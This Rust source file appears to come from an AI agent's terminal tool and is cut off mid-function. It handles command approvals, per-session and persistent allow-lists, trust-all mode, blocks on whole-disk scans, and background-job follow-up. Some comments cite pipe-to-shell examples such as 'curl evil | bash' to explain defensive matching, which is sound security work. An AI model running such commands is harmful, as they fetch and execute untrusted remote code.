fn expand_home_in_operand(operand: &str) -> Option<String> {
    let home = std::env::var("HOME").ok()?;
    if home.is_empty() {
        return None;
    }
    let home = home.trim_end_matches('/');
    if operand == "~" || operand == "$HOME" {
        return Some(home.to_string());
    }
    if let Some(rest) = operand.strip_prefix("~/") {
        return Some(format!("{home}/{rest}"));
    }
    if let Some(rest) = operand.strip_prefix("$HOME/") {
        return Some(format!("{home}/{rest}"));
    }
    None
}

/// Derive the read-only remediation scope (working_dir) from the FAILED
/// command's actual target, rather than always using the daemon cwd.
///
/// Semantics (3c scope relax):
/// - A target over home (`~`, `$HOME`, the home path, or a glob beneath it,
///   e.g. `du ~/*`, `find ~ …`) → the home directory.
/// - A target over `/` (e.g. `du /`, `find / …`) → `/`.
/// - A specific bounded dir (e.g. a path under home/projects) → that dir,
///   canonicalized when it exists.
/// - Indeterminate (no path operand) → the daemon cwd fallback (canonicalized),
///   as before.
///
/// The safety for broad scopes lives in the sandbox's read-only allowlist +
/// sensitive-file guards, not in this derived working_dir. UTF-8-safe: parsing
/// goes through `shell_words` + `str` ops, no raw byte slicing.
fn derive_correction_scope_from_command(command: &str) -> std::path::PathBuf {
    let fallback = || TerminalTool::correction_working_dir();

    let home = std::env::var("HOME")
        .ok()
        .filter(|h| !h.is_empty())
        .map(|h| h.trim_end_matches('/').to_string());

    // Walk every chained segment; take the first segment that has a usable path
    // operand, preferring the broadest scope it implies.
    for (segment, _) in crate::tools::command_risk::split_by_operators(command) {
        let Ok(tokens) = shell_words::split(&segment) else {
            continue;
        };
        // Skip the leading tool name; inspect its operands.
        for tok in tokens.iter().skip(1) {
            if tok.starts_with('-') {
                continue; // flag, not a path
            }

            // Broad root: `/`, `~`, `$HOME`, the home path, or a glob over them.
            if is_broad_scan_root(tok) {
                if tok.trim() == "/" {
                    return std::path::PathBuf::from("/");
                }
                // `~`, `$HOME`, or the literal home path → home dir.
                if let Some(h) = &home {
                    let p = std::path::PathBuf::from(h);
                    return std::fs::canonicalize(&p).unwrap_or(p);
                }
                return fallback();
            }

            // A glob/path beneath home (e.g. `~/*`, `$HOME/*`, `<home>/*`).
            // Strip a trailing glob component so `~/*` resolves to home itself.
            let expanded = expand_home_in_operand(tok).unwrap_or_else(|| tok.to_string());
            let scope = scope_dir_from_path_operand(&expanded, home.as_deref());
            if let Some(dir) = scope {
                let p = std::path::PathBuf::from(&dir);
                return std::fs::canonicalize(&p).unwrap_or(p);
            }
        }
    }

    fallback()
}

/// Reduce a (home-expanded) path operand to the directory scope it targets.
/// A trailing glob segment (e.g. `*`, `foo*`) is dropped so `<home>/*` →
/// `<home>`. Returns `None` for operands that carry no usable absolute path.
fn scope_dir_from_path_operand(expanded: &str, home: Option<&str>) -> Option<String> {
    let trimmed = expanded.trim();
    if trimmed.is_empty() {
        return None;
    }
    // Drop a trailing glob component so `/home/u/*` → `/home/u`.
    let without_glob = if let Some(idx) = trimmed.rfind('/') {
        let (parent, last) = trimmed.split_at(idx); // last starts with '/'
        let last = &last[1..];
        if last.contains('*') || last.contains('?') || last == "." {
            parent
        } else {
            trimmed
        }
    } else if trimmed.contains('*') || trimmed.contains('?') {
        // Bare glob with no slash and not home-rooted → indeterminate.
        return None;
    } else {
        trimmed
    };

    let candidate = without_glob.trim_end_matches('/');
    let candidate = if candidate.is_empty() { "/" } else { candidate };

    // Only absolute paths are usable scopes. If the operand collapsed to the
    // home dir, return that; otherwise require an absolute path.
    if let Some(h) = home {
        if candidate == h {
            return Some(h.to_string());
        }
    }
    if std::path::Path::new(candidate).is_absolute() {
        return Some(candidate.to_string());
    }
    None
}

/// Detect an unbounded whole-disk/whole-home scan in a single shell segment.
/// `du` over a broad root is always flagged (it walks the full subtree to sum
/// sizes; `-d` only limits output depth). `find` over a broad root is flagged
/// unless `-maxdepth` is present (which bounds traversal). Returns (tool, root).
#[allow(dead_code)]
fn detect_unbounded_disk_scan_segment(segment: &str) -> Option<(String, String)> {
    let tokens = shell_words::split(segment).ok()?;
    let first = tokens.first()?;
    // Strip any leading path (e.g. /usr/bin/du -> du).
    let tool = std::path::Path::new(first)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(first.as_str());

    match tool {
        "du" => {
            // Any non-flag arg that is a broad root.
            let root = tokens
                .iter()
                .skip(1)
                .find(|t| !t.starts_with('-') && is_broad_scan_root(t))?;
            Some(("du".to_string(), root.clone()))
        }
        "find" => {
            // find's search roots come before the expression; check leading
            // non-flag args, but only flag if there is no -maxdepth limiter.
            let has_maxdepth = tokens.iter().any(|t| t == "-maxdepth");
            if has_maxdepth {
                return None;
            }
            // `-delete` is caught by the irreversible-delete hard-blocker;
            // let it pass through so the right message fires.
            if tokens.iter().any(|t| t == "-delete") {
                return None;
            }
            let root = tokens
                .iter()
                .skip(1)
                .take_while(|t| !t.starts_with('-'))
                .find(|t| is_broad_scan_root(t))?;
            Some(("find".to_string(), root.clone()))
        }
        _ => None,
    }
}

/// Scan the whole command (including chained `&&`/`|`/`;` segments) for an
/// unbounded whole-disk/whole-home scan.
fn detect_unbounded_disk_scan(command: &str) -> Option<(String, String)> {
    for (segment, _) in crate::tools::command_risk::split_by_operators(command) {
        if let Some(hit) = detect_unbounded_disk_scan_segment(&segment) {
            return Some(hit);
        }
    }
    None
}

/// Guidance returned to the model when an unbounded scan is blocked pre-spawn.
fn unbounded_scan_block_message(tool: &str, root: &str) -> String {
    format!(
        "Blocked: `{tool}` rooted at `{root}` scans the entire {} and is pathologically slow \
         — it walks every file and typically never finishes (it gets auto-stopped after a few \
         minutes without ever answering). Use a narrower, bounded command instead:\n\
         • For \"biggest files\": pick a specific folder — `find ~/Downloads -type f -size +500M` \
         or `find ~/projects -type f -size +500M`.\n\
         • Add a depth limit so traversal is bounded: `find <DIR> -maxdepth 3 …`.\n\
         • Scope `du` to a single folder: `du -sh ~/<folder>/*` (not the whole disk or home).\n\
         If the user truly needs a whole-disk scan, ask them to confirm or run it themselves.\n\
         Pick a scoped command and try again.",
        if root == "/" {
            "disk"
        } else {
            "home directory"
        }
    )
}

fn normalize_command_for_dedupe(command: &str) -> String {
    command.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Drain an async reader into a capped buffer.
async fn drain_to_buffer<R: tokio::io::AsyncRead + Unpin>(mut reader: R, buf: Arc<Mutex<Vec<u8>>>) {
    let mut tmp = [0u8; 8192];
    loop {
        match reader.read(&mut tmp).await {
            Ok(0) => break,
            Ok(n) => {
                let mut b = buf.lock().await;
                let remaining = BUFFER_CAP.saturating_sub(b.len());
                if remaining > 0 {
                    let to_copy = n.min(remaining);
                    b.extend_from_slice(&tmp[..to_copy]);
                }
            }
            Err(_) => break,
        }
    }
}

/// Render an elapsed-seconds count as a friendly duration for user-facing
/// progress messages (e.g. 65 -> "1m 5s", 40 -> "40s", 3600 -> "1h 0m").
fn humanize_elapsed(secs: u64) -> String {
    crate::duration_format::compact_seconds(
        secs as i64,
        crate::duration_format::ZeroUnitStyle::Keep,
    )
}

/// Condense in-flight background output for a user-facing progress ping.
/// Chatty commands (e.g. `ls -R`) accumulate thousands of lines; the chat
/// ping only needs proof of life, so report a line count plus the most
/// recent lines. The full output still reaches the agent on completion.
fn summarize_progress_output(output: &str) -> String {
    const MAX_PING_LINES: usize = 3;
    const MAX_PING_LINE_CHARS: usize = 160;
    let lines: Vec<&str> = output
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    let total = lines.len();
    let tail = lines
        .iter()
        .skip(total.saturating_sub(MAX_PING_LINES))
        .map(|l| truncate_str(l, MAX_PING_LINE_CHARS))
        .collect::<Vec<_>>()
        .join("\n");
    if total > MAX_PING_LINES {
        format!("{} lines of output so far. Latest:\n{}", total, tail)
    } else {
        tail
    }
}

/// Format combined stdout/stderr output. Returns the (untruncated-notice)
/// text plus structured [`TruncationInfo`] when the output was cut down.
/// Callers decide how the notice reaches the model: foreground call sites
/// attach it to the outgoing `ToolCallOutcome.metadata.truncation` (rendered
/// once by the agent loop); background-delivery call sites, which bypass the
/// loop entirely, render it inline immediately via
/// `crate::utils::render_truncation_notice`.
fn format_output(
    stdout: &str,
    stderr: &str,
    max_chars: usize,
) -> (String, Option<crate::traits::TruncationInfo>) {
    let mut result = String::new();
    if !stdout.is_empty() {
        result.push_str(stdout);
    }
    if !stderr.is_empty() {
        if !result.is_empty() {
            result.push_str("\n--- stderr ---\n");
        }
        result.push_str(stderr);
    }
    if result.is_empty() {
        result.push_str("(no output)");
    }
    let mut truncation = None;
    if result.len() > max_chars {
        let total_chars = result.chars().count();
        // Find the nearest valid UTF-8 char boundary at or before max_chars
        let mut truncate_at = max_chars;
        while truncate_at > 0 && !result.is_char_boundary(truncate_at) {
            truncate_at -= 1;
        }
        result.truncate(truncate_at);
        truncation = Some(crate::traits::TruncationInfo {
            shown_chars: result.chars().count(),
            total_chars,
            remediation_hint: None,
        });
    }
    (result, truncation)
}

/// Upper bound (chars / lines) on a background command's output that is
/// delivered to the user *directly* instead of through the agent
/// re-engagement loop. Short, complete results — a `wc -l` count, a path, a
/// one-line status — are the whole answer; re-engaging adds no summarization
/// value and, with small local models, tends to make the model RE-RUN the
/// command, re-detaching to the background and emitting duplicate "finished"
/// pings. Direct delivery guarantees the answer with no churn.
const SHORT_OUTPUT_DIRECT_DELIVERY_MAX_CHARS: usize = 200;
const SHORT_OUTPUT_DIRECT_DELIVERY_MAX_LINES: usize = 4;

/// True when a (non-empty) background result is short and self-contained
/// enough to deliver directly rather than re-feed into the agent loop.
/// The caller must already have excluded empty / "(no output)" results.
/// Build the background-completion ping. When the output is non-trivial a
/// re-engagement (or tool-less interpretation) turn follows to compose the
/// actual answer — on a slow local model that takes minutes, so the ping must
/// say the answer is still coming instead of reading as terminal ("Done" +
/// silence). `answer_follows` must be false for trivial output, where no
/// follow-up happens and the promise would be a lie.
fn background_completion_ping_message(
    exit_code: Option<i32>,
    elapsed_secs: u64,
    answer_follows: bool,
) -> String {
    if exit_code == Some(0) {
        let mut m = format!("✅ Done — finished in {}.", humanize_elapsed(elapsed_secs));
        if answer_follows {
            m.push_str(" Writing up the result now…");
        }
        m
    } else {
        let mut m = format!(
            "⚠️ Background command finished with errors in {}",
            humanize_elapsed(elapsed_secs)
        );
        if let Some(code) = exit_code {
            m.push_str(&format!(" (exit code {})", code));
        }
        m.push('.');
        if answer_follows {
            m.push_str(" Looking at the output now…");
        }
        m
    }
}

fn is_short_complete_output(output_trimmed: &str) -> bool {
    output_trimmed.chars().count() <= SHORT_OUTPUT_DIRECT_DELIVERY_MAX_CHARS
        && output_trimmed.lines().count() <= SHORT_OUTPUT_DIRECT_DELIVERY_MAX_LINES
}

/// Friendly, pid-free delivery message for a short background result. Inline
/// code for a one-liner (e.g. a count); a fenced block for a few lines.
fn format_short_background_result(output_trimmed: &str) -> String {
    if output_trimmed.contains('\n') {
        format!("Result:\n```\n{}\n```", output_trimmed)
    } else {
        format!("Result: `{}`", output_trimmed)
    }
}

/// Build the internal follow-up that re-engages the agent loop after a
/// background command completes. Beyond replaying the output, it explicitly
/// steers the model to finish any *deferred deliverable* the user requested
/// before the command was backgrounded. This matters because the original turn
/// ends the moment a long-running command detaches: a request like "send me the
/// file when done" would otherwise be silently dropped, since the model would
/// just summarize the output instead of completing the requested action.
fn build_background_reengagement_followup(
    command_summary: &str,
    output: &str,
    unchecked: &[String],
) -> String {
    let mut s = format!(
        "[Background command completed]\n\
         Command: `{command_summary}`\n\
         Output:\n{output}\n\n\
         This command was part of your previous task. Check your session history \
         for the original user request and continue where you left off, using the \
         output above to proceed with the remaining steps.\n"
    );
    if unchecked.is_empty() {
        // No durable checklist for this task — fall back to generic deferred-
        // deliverable steering (the interim behavior from 74324f9).
        s.push_str(
            "If the original request asked you to send, share, or deliver a file (or \
             produce any other deliverable), complete that now — for a file, call the \
             send_file tool with the produced file's path. Do not just describe the \
             result; perform the action the user asked for.",
        );
    } else {
        // Persisted checklist exists — list the still-unchecked requirements so
        // the model completes the exact deferred items, not a guess.
        s.push_str(
            "The following tracked requirements for this task are still UNCHECKED — \
             complete each one now:\n",
        );
        for item in unchecked {
            s.push_str(&format!("- {item}\n"));
        }
        s.push_str(
            "For a file deliverable, call send_file with the produced file's path. After \
             completing each item, call track_requirements to mark it 'completed'.",
        );
    }
    s
}

impl TerminalTool {
    pub async fn new(
        allowed_prefixes: Vec<String>,
        approval_tx: super::ApprovalBroker,
        initial_timeout_secs: u64,
        max_output_chars: usize,
        permission_mode: PermissionMode,
        pool: SqlitePool,
    ) -> Self {
        // Log permission mode on startup
        match permission_mode {
            PermissionMode::Yolo => {
                warn!("⚠️  YOLO mode enabled: all command approvals persist forever, including critical commands");
            }
            PermissionMode::Cautious => {
                info!("Cautious mode: all command approvals are session-only");
            }
            PermissionMode::Default => {
                info!("Default permission mode: critical commands require per-session approval");
            }
        }

        // Load persisted prefixes from DB and merge with config defaults
        let mut merged = allowed_prefixes;

        // YOLO mode: auto-approve everything
        if permission_mode == PermissionMode::Yolo && !merged.contains(&"*".to_string()) {
            merged.push("*".to_string());
        }
        match sqlx::query_scalar::<_, String>("SELECT prefix FROM terminal_allowed_prefixes")
            .fetch_all(&pool)
            .await
        {
            Ok(persisted) => {
                for p in persisted {
                    if !merged.contains(&p) {
                        info!(prefix = %p, "Loaded persisted allowed prefix");
                        merged.push(p);
                    }
                }
            }
            Err(e) => {
                warn!("Failed to load persisted terminal prefixes: {}", e);
            }
        }

        Self {
            allowed_prefixes: Arc::new(RwLock::new(merged)),
            session_approved: Arc::new(RwLock::new(HashSet::new())),
            permission_mode,
            approval_tx,
            running: Arc::new(Mutex::new(HashMap::new())),
            running_by_dedupe_key: Arc::new(Mutex::new(HashMap::new())),
            task_processes: Arc::new(Mutex::new(HashMap::new())),
            completed: Arc::new(Mutex::new(HashMap::new())),
            initial_timeout: Duration::from_secs(initial_timeout_secs),
            max_output_chars,
            pool: Some(pool),
            event_store: None,
            state: None,
            hub: OnceLock::new(),
            agent: OnceLock::new(),
            reengagements: Arc::new(Mutex::new(HashMap::new())),
            recent_background_deliveries: Arc::new(Mutex::new(HashMap::new())),
            delivered_deliverables: Arc::new(Mutex::new(HashMap::new())),
            plan_store: OnceLock::new(),
            inbox_dir: std::env::temp_dir(),
            outbox_dirs: Vec::new(),
            self_correction: SelfCorrectionConfig::default(),
        }
    }

    /// Wire the inbox + outbox directories used by harness-side background
    /// deliverable delivery (`prepare_delivery`). Mirrors the dirs `send_file`
    /// is constructed with. Without this, delivery defaults to the system temp
    /// dir as inbox with no extra outbox dirs.
    pub fn with_delivery_dirs(mut self, inbox_dir: PathBuf, outbox_dirs: Vec<PathBuf>) -> Self {
        self.inbox_dir = inbox_dir;
        self.outbox_dirs = outbox_dirs;
        self
    }

    /// Wire the self-correction config so the idle-reaper can dispatch
    /// autonomous remediation when it stops a hung background command. Without
    /// this, `self_correction` is the safe-off default and the reaper only ever
    /// sends the existing user notification.
    pub fn with_self_correction(mut self, config: SelfCorrectionConfig) -> Self {
        self.self_correction = config;
        self
    }

    pub fn with_event_store(mut self, event_store: Arc<EventStore>) -> Self {
        self.event_store = Some(event_store);
        self
    }

    pub fn with_state(mut self, state: Arc<dyn StateStore>) -> Self {
        self.state = Some(state);
        self
    }

    /// Set channel hub reference for immediate background progress/completion delivery.
    pub fn set_hub(&self, hub: Weak<ChannelHub>) {
        let _ = self.hub.set(hub);
    }

    fn get_hub(&self) -> Option<Arc<ChannelHub>> {
        self.hub.get().and_then(|w| w.upgrade())
    }

    /// Set agent reference so background command completions can re-engage
    /// the agent loop to process the output and continue the original task.
    pub fn set_agent(&self, agent: Weak<crate::agent::Agent>) {
        let _ = self.agent.set(agent);
    }

    /// Wire the durable plan store so the background completion notifier can read
    /// the session's incomplete checklist (for deliverable attribution + the
    /// conservative delivery-step write-back).
    pub fn set_plan_store(&self, plan_store: Arc<crate::plans::PlanStore>) {
        let _ = self.plan_store.set(plan_store);
    }

    async fn is_allowed(&self, command: &str) -> bool {
        let prefixes = self.allowed_prefixes.read().await;
        if prefixes.iter().any(|p| p == "*") {
            return true;
        }
        let trimmed = command.trim();
        let has_shell_ops = contains_shell_operator(trimmed);

        // For chained commands (&&, ||, ;, |), check each segment's binary
        // against both permanent and session-approved prefixes.
        // This means approving `curl ... | python3 ...` also allows
        // `curl ... | grep ...` since both curl and grep are safe/approved.
        if has_shell_ops {
            let session = self.session_approved.read().await;
            // 1) Exact full-command match: session approvals store chained
            //    commands verbatim (`add_session_prefix`), and legacy
            //    permanent entries (pre-segment-binary `add_prefix`) stored
            //    whole chained commands too.
            if session.iter().any(|s| trimmed == s.as_str())
                || prefixes.iter().any(|p| trimmed == p.as_str())
            {
                return true;
            }
            // 2) Per-segment match: every segment's binary must be in the
            //    PERMANENT prefix list (configured by the operator). We
            //    deliberately do NOT consult `session` here — a simple-command
            //    session approval for `curl` must not retroactively unlock
            //    arbitrary chained commands like `curl evil | bash`. Operator-
            //    configured permanent prefixes are trusted; ad-hoc session
            //    approvals are not.
            let segments = split_command_segments(trimmed);
            if !segments.is_empty() {
                return segments.iter().all(|seg| {
                    let binary = extract_segment_binary(seg);
                    if binary.is_empty() {
                        return true;
                    }
                    prefixes.iter().any(|p| p == "*" || binary == p.as_str())
                });
            }
            return false;
        }

        // Check permanent prefixes
        let matches_permanent = prefixes.iter().any(|prefix| {
            trimmed == prefix.as_str()
                || trimmed.starts_with(&format!("{} ", prefix))
                || trimmed.starts_with(&format!("{}\t", prefix))
        });

        if matches_permanent {
            return true;
        }

        // Check session-approved prefixes
        let session = self.session_approved.read().await;
        session.iter().any(|prefix| {
            trimmed == prefix.as_str()
                || trimmed.starts_with(&format!("{} ", prefix))
                || trimmed.starts_with(&format!("{}\t", prefix))
        })
    }

    /// Add a prefix to session-only approved list (cleared on restart).
    ///
    /// For SIMPLE commands (no shell operators), stores the first word as a
    /// prefix — any future command starting with the same binary is allowed.
    ///
    /// For CHAINED commands (containing shell operators), stores ONLY the
    /// full trimmed command for exact-match matching. We intentionally do NOT
    /// add per-segment binaries to the session prefix set: approving
    /// `curl https://example.com | python3 -c '<safe>'` once must NOT later
    /// auto-allow `curl https://attacker.com | python3 -c '<evil>'`. The
    /// exact-match check in `is_allowed` handles legitimate re-runs.
    async fn add_session_prefix(&self, command: &str) {
        let trimmed = command.trim();
        let mut session = self.session_approved.write().await;
        if contains_shell_operator(trimmed) {
            // Store the full chained command verbatim; matched exactly by
            // `is_allowed`'s legacy full-command check.
            if session.insert(trimmed.to_string()) {
                info!(
                    command = %trimmed,
                    "Session-approved full chained command (exact-match only)"
                );
            }
        } else {
            let key = trimmed
                .split_whitespace()
                .next()
                .unwrap_or(trimmed)
                .to_string();
            if session.insert(key.clone()) {
                info!(
                    prefix = %key,
                    "Added to session-approved prefixes (will reset on restart)"
                );
            }
        }
    }

    async fn request_approval(
        &self,
        session_id: &str,
        command: &str,
        risk_level: RiskLevel,
        warnings: Vec<String>,
        task_id: Option<&str>,
    ) -> anyhow::Result<ApprovalResponse> {
        if let Some(store) = &self.event_store {
            let emitter = crate::events::EventEmitter::new(store.clone(), session_id.to_string());
            let _ = emitter
                .emit(
                    EventType::ApprovalRequested,
                    ApprovalRequestedData {
                        command: command.to_string(),
                        risk_level: risk_level.to_string(),
                        warnings: warnings.clone(),
                        task_id: task_id.map(str::to_string),
                    },
                )
                .await;
        }

        let (response_tx, response_rx) = tokio::sync::oneshot::channel();
        if let Err(send_err) = self
            .approval_tx
            .send(ApprovalRequest {
                command: command.to_string(),
                session_id: session_id.to_string(),
                risk_level,
                warnings,
                permission_mode: self.permission_mode,
                response_tx,
                kind: Default::default(),
            })
            .await
        {
            if let Some(store) = &self.event_store {
                let emitter =
                    crate::events::EventEmitter::new(store.clone(), session_id.to_string());
                let _ = emitter
                    .emit(
                        EventType::ApprovalDenied,
                        ApprovalDeniedData {
                            command: command.to_string(),
                            task_id: task_id.map(str::to_string),
                        },
                    )
                    .await;
            }
            return Err(anyhow::anyhow!("Approval channel closed: {}", send_err));
        }

        // Sub-agents get a short timeout
        // since they can't reliably receive user approval through the channel hub.
        // They should use safe tools (edit_file, write_file) instead of risky terminal commands.
        // `sub-` is the legacy prefix; new child sessions use `specialist:`.
        let timeout_secs =
            if session_id.starts_with("sub-") || session_id.starts_with("specialist:") {
                10
            } else {
                300
            };
        let response: ApprovalResponse =
            match tokio::time::timeout(std::time::Duration::from_secs(timeout_secs), response_rx)
                .await
            {
                Ok(Ok(response)) => response,
                Ok(Err(_)) => {
                    tracing::warn!(command, "Approval response channel closed");
                    ApprovalResponse::Deny
                }
                Err(_) => {
                    tracing::warn!(
                        command,
                        timeout_secs,
                        "Approval request timed out, auto-denying"
                    );
                    ApprovalResponse::Deny
                }
            };

        if let Some(store) = &self.event_store {
            let emitter = crate::events::EventEmitter::new(store.clone(), session_id.to_string());
            match response {
                ApprovalResponse::AllowOnce => {
                    let _ = emitter
                        .emit(
                            EventType::ApprovalGranted,
                            ApprovalGrantedData {
                                command: command.to_string(),
                                approval_type: "once".to_string(),
                                task_id: task_id.map(str::to_string),
                            },
                        )
                        .await;
                }
                ApprovalResponse::AllowSession => {
                    let _ = emitter
                        .emit(
                            EventType::ApprovalGranted,
                            ApprovalGrantedData {
                                command: command.to_string(),
                                approval_type: "session".to_string(),
                                task_id: task_id.map(str::to_string),
                            },
                        )
                        .await;
                }
                ApprovalResponse::AllowAlways => {
                    let _ = emitter
                        .emit(
                            EventType::ApprovalGranted,
                            ApprovalGrantedData {
                                command: command.to_string(),
                                approval_type: "always".to_string(),
                                task_id: task_id.map(str::to_string),
                            },
                        )
                        .await;
                }
                ApprovalResponse::Deny => {
                    let _ = emitter
                        .emit(
                            EventType::ApprovalDenied,
                            ApprovalDeniedData {
                                command: command.to_string(),
                                task_id: task_id.map(str::to_string),
                            },
                        )
                        .await;
                }
            }
        }

        Ok(response)
    }

    async fn add_prefix(&self, command: &str) {
        let trimmed = command.trim();
        // For chained commands, approve each segment's binary; for simple
        // commands, the first word. Storing segment binaries (rather than the
        // full chained string) lets "Allow Always" cover re-runs that differ
        // only in arguments — the same trust grant as Always-allowing each
        // simple command directly, and what `is_allowed`'s per-segment
        // chained check matches against.
        let keys: Vec<String> = if contains_shell_operator(trimmed) {
            split_command_segments(trimmed)
                .iter()
                .map(|seg| extract_segment_binary(seg))
                .filter(|b| !b.is_empty())
                .map(str::to_string)
                .collect()
        } else {
            vec![trimmed
                .split_whitespace()
                .next()
                .unwrap_or(trimmed)
                .to_string()]
        };
        let mut prefixes = self.allowed_prefixes.write().await;
        for key in keys {
            if key == "*" {
                warn!("Refusing to add wildcard '*' as permanent prefix");
                continue;
            }
            if !prefixes.contains(&key) {
                info!(prefix = %key, "Adding to allowed command prefixes (persistent)");
                prefixes.push(key.clone());

                // Persist to SQLite
                if let Some(ref pool) = self.pool {
                    if let Err(e) = sqlx::query(
                        "INSERT OR IGNORE INTO terminal_allowed_prefixes (prefix) VALUES (?)",
                    )
                    .bind(&key)
                    .execute(pool)
                    .await
                    {
                        warn!(prefix = %key, "Failed to persist allowed prefix: {}", e);
                    }
                }
            }
        }
    }

    fn dedupe_scope_key(
        notify_session_id: &str,
        notify_goal_id: Option<&str>,
        task_id: Option<&str>,
    ) -> String {
        if let Some(goal_id) = notify_goal_id.filter(|value| !value.trim().is_empty()) {
            return format!("goal:{}", goal_id.trim());
        }
        if let Some(task_id) = task_id.filter(|value| !value.trim().is_empty()) {
            return format!("task:{}", task_id.trim());
        }
        format!("session:{}", notify_session_id.trim())
    }

    fn dedupe_key_for_run(
        command: &str,
        notify_session_id: &str,
        notify_goal_id: Option<&str>,
        task_id: Option<&str>,
    ) -> String {
        let scope = Self::dedupe_scope_key(notify_session_id, notify_goal_id, task_id);
        let normalized = normalize_command_for_dedupe(command);
        format!("{}|{}", scope, normalized)
    }

    async fn insert_indexes_for_process(
        &self,
        pid: u32,
        dedupe_key: Option<&str>,
        owner_task_id: Option<&str>,
        detached: bool,
    ) {
        if let Some(key) = dedupe_key {
            self.running_by_dedupe_key
                .lock()
                .await
                .insert(key.to_string(), pid);
        }

        if !detached {
            if let Some(task_id) = owner_task_id {
                let mut task_map = self.task_processes.lock().await;
                task_map.entry(task_id.to_string()).or_default().insert(pid);
            }
        }
    }

    async fn remove_indexes_for_process(&self, pid: u32, proc: &RunningProcess) {
        if let Some(key) = proc.dedupe_key.as_ref() {
            let mut dedupe = self.running_by_dedupe_key.lock().await;
            if dedupe.get(key).copied() == Some(pid) {
                dedupe.remove(key);
            }
        }

        if !proc.detached {
            if let Some(task_id) = proc.owner_task_id.as_ref() {
                let mut task_map = self.task_processes.lock().await;
                let mut remove_task_key = false;
                if let Some(pids) = task_map.get_mut(task_id) {
                    pids.remove(&pid);
                    remove_task_key = pids.is_empty();
                }
                if remove_task_key {
                    task_map.remove(task_id);
                }
            }
        }
    }

    async fn resolve_duplicate_running_pid(&self, dedupe_key: &str) -> Option<u32> {
        let tracked_pid = {
            let dedupe = self.running_by_dedupe_key.lock().await;
            dedupe.get(dedupe_key).copied()
        }?;

        let is_live = {
            let running = self.running.lock().await;
            running
                .get(&tracked_pid)
                .is_some_and(|proc| !proc.reader_handle.is_finished())
        };
        if is_live {
            return Some(tracked_pid);
        }

        // Stale index entry from a process that's already finished/reaped.
        let mut dedupe = self.running_by_dedupe_key.lock().await;
        if dedupe.get(dedupe_key).copied() == Some(tracked_pid) {
            dedupe.remove(dedupe_key);
        }
        None
    }

    async fn terminate_running_process(
        &self,
        pid: u32,
        proc: RunningProcess,
        reason: &str,
    ) -> anyhow::Result<(String, Option<crate::traits::TruncationInfo>)> {
        proc.notify_on_completion.store(false, Ordering::Relaxed);
        let child_pid = proc.child_id;
        let started_at = proc.started_at;
        let command = proc.command.clone();
        let stdout_buf = proc.stdout_buf.clone();
        let stderr_buf = proc.stderr_buf.clone();
        let reader_handle = proc.reader_handle;

        if !reader_handle.is_finished() {
            let term_sent = send_sigterm(child_pid);
            if term_sent {
                let finished = tokio::time::timeout(Duration::from_secs(2), async {
                    loop {
                        if reader_handle.is_finished() {
                            return;
                        }
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                })
                .await;

                if finished.is_err() && !reader_handle.is_finished() {
                    send_sigkill(child_pid);
                    tokio::time::sleep(Duration::from_millis(200)).await;
                }
            } else {
                send_sigkill(child_pid);
                tokio::time::sleep(Duration::from_millis(200)).await;
            }
        }

        if !reader_handle.is_finished() {
            reader_handle.abort();
        }
        let _ = reader_handle.await;

        let stdout = String::from_utf8_lossy(&stdout_buf.lock().await).to_string();
        let stderr = String::from_utf8_lossy(&stderr_buf.lock().await).to_string();
        let mut output = format!(
            "[Process pid={} stopped after {:.0}s (reason: {}, command: `{}`)]\n",
            pid,
            started_at.elapsed().as_secs_f64(),
            reason,
            command
        );
        let (formatted, truncation) = format_output(&stdout, &stderr, self.max_output_chars);
        output.push_str(&formatted);
        Ok((output, truncation))
    }

    async fn cleanup_task_processes(&self, task_id: &str) -> anyhow::Result<usize> {
        self.reap_finished().await;
        let cleaned_pids = {
            let mut task_map = self.task_processes.lock().await;
            task_map.remove(task_id).unwrap_or_default()
        };
        if cleaned_pids.is_empty() {
            return Ok(0);
        }

        let mut to_cleanup = Vec::new();
        let mut to_disown = Vec::new();
        {
            let mut running = self.running.lock().await;
            for pid in cleaned_pids {
                if let Some(proc) = running.remove(&pid) {
                    // If the background notifier task was actually spawned and is actively
                    // monitoring this process, the user was promised completion notifications.
                    // Don't kill it — just disown it from the task and let the notifier
                    // handle delivery when the process finishes naturally.
                    if proc.notifier_active {
                        to_disown.push((pid, proc));
                    } else {
                        to_cleanup.push((pid, proc));
                    }
                }
            }
        }

        // Re-insert disowned processes so the notifier can still track them.
        // Clear owner_task_id so `check` no longer reports them as task-owned.
        if !to_disown.is_empty() {
            let mut running = self.running.lock().await;
            for (pid, mut proc) in to_disown {
                info!(
                    pid,
                    task_id,
                    command = %proc.command,
                    "Disowning background process from task (notifier active, will deliver completion)"
                );
                proc.owner_task_id = None;
                running.insert(pid, proc);
            }
        }

        // Lock-order discipline: do not hold `running` while mutating secondary
        // indexes. Index helpers acquire their own locks (`running_by_dedupe_key`,
        // `task_processes`) after the primary `running` lock is dropped.
        for (pid, proc) in &to_cleanup {
            self.remove_indexes_for_process(*pid, proc).await;
            self.completed.lock().await.remove(pid);
        }

        let mut cleaned = 0usize;
        for (pid, proc) in to_cleanup {
            match self
                .terminate_running_process(pid, proc, "task ended")
                .await
            {
                Ok(_) => cleaned += 1,
                Err(e) => {
                    warn!(
                        pid,
                        task_id,
                        error = %e,
                        "Failed to stop task-owned background process"
                    );
                }
            }
        }
        Ok(cleaned)
    }

    /// Enable trust-all mode: auto-approve all commands without prompting.
    /// Requires user approval since this is a security-sensitive action.
    async fn handle_trust_all(&self, session_id: &str) -> anyhow::Result<String> {
        // Check if already in trust-all mode
        {
            let prefixes = self.allowed_prefixes.read().await;
            if prefixes.iter().any(|p| p == "*") {
                return Ok(
                    "Trust-all mode is already enabled. All commands are auto-approved."
                        .to_string(),
                );
            }
        }

        // Request user approval
        match self
            .request_approval(
                session_id,
                "ENABLE TRUST-ALL MODE",
                RiskLevel::Critical,
                vec![
                    "All future commands will run without approval".to_string(),
                    "This includes dangerous commands (rm, sudo, etc.)".to_string(),
                    "Persists across restarts".to_string(),
                ],
                None,
            )
            .await
        {
            Ok(ApprovalResponse::AllowOnce)
            | Ok(ApprovalResponse::AllowSession)
            | Ok(ApprovalResponse::AllowAlways) => {
                // Add * to allowed prefixes
                let mut prefixes = self.allowed_prefixes.write().await;
                if !prefixes.iter().any(|p| p == "*") {
                    prefixes.push("*".to_string());
                    info!("Trust-all mode enabled: all commands will be auto-approved");

                    // Persist to database
